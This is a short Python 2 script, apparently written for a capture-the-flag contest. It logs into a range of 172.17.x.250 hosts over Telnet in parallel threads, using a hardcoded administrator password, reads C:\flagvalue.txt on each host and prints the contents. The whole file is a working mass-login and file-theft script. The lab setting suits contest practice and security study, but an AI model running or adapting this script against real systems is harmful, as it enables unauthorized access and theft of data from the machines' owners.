import telnetlib,threading
def a(ip):
    try:
        t=telnetlib.Telnet(ip,23,timeout=1)
        t.read_until("login:")
        t.write("administrator\r\n")
        t.read_until("password:")
        t.write("771213110a!\r\n")
        t.read_until("C:")
        t.write("type C:\\flagvalue.txt\r\n")
        t.write("exit\r\n")
        print t.read_all().split("\r\n")[1],ip
    except Exception,e:
        print e
        pass
for i in range(141,149):
    threading.Thread(target=a,args=("172.17.{}.250".format(i,),)).start()
